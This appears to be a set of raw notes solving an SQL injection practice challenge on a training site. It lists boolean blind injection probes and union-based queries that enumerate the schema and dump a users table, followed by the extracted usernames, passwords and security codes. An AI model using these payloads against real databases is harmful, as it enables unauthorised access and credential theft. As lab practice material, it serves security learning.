and true%23

and Ascii(substring(version(),1,1)) >0x34
and Ascii(substring(version(),1,1)) =0x35

and Ascii(substring(database(),1,1)) >97
and Ascii(substring(char_length(database()),1,1)) =101


and Ascii(substring((select char_length(table_name) from information_schema.tables where table_schema like '%leettime%' and table_name like '%user%'limit 0,1),5,1))>97


and Ascii(substring((select char_length(column_name) from information_schema.columns where table_schema like '%leettime%' and table_name like '%user%' and column_name like '%pass%'limit 0,1),1,1))<97


and Ascii(substring((select column_name from information_schema.columns where table_schema like '%leettime%' and table_name like '%user%' and column_name like '%username%'limit 0,1),1,1))>97


and Ascii(substring((select username from leettime.users where username like '%admin%'),1,1)) >97



and Ascii(substring((select count(table_schema) from information_schema.schemas),1,1)) =0x35



Basic Injection Challenge 1
http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1
order by 3%23
3 columns

union select 1,2,3
union select null,database(),null
DB:leettime_761wHole

union select null,table_name,null from information_schema.tables where table_schema=database() limit 0,1
testtable1
userlogs
users


union select null,column_name,null from information_schema.columns where table_schema=database()  and table_name='users'limit 0,1
 id
 username
 password
 user_type
 sec_code
 
 

union select null,concat(id,0x09,username,0x09,password,0x09,sec_code),null from leettime_761wHole.users

Username is : 1 injector khan LJDFAL123123
Username is : 2 decompiler hacktract LADQAL128271
Username is : 3 devilhunte dante LATQAL1987A1
Username is : 4 Zen sec-idiots LADQAL128271
Username is : 5 Zenodermus security-i LASQAL12RT90
Username is : 6 grayhat hacker 987AKHASD987
Username is : 7 khan haxor KSDLWEL12222
Username is : 8 admin sadmin 34DFA3423DFD








